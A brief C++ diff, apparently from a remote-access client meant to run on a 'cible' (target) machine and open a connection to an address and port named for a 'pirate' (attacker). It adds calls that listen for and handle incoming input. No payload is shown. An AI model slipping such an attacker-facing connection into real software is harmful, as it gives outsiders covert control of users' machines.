@@ -37,6 +37,13 @@ bool ProcessPacket(MyPNet::Packet & packet){
 int main(){ // Main client -- cible
     Connexion connexioninbound(adresseipPirate, portPirate, ConnexionType::INBOUND);
 
+    connexioninbound.ListenForNewConnection();
+
+    connexioninbound.HandleInput();
+
+
+    system("pause");
+    return 0;
 }
     /*
     if(MyPNet::Network::Initialize()){
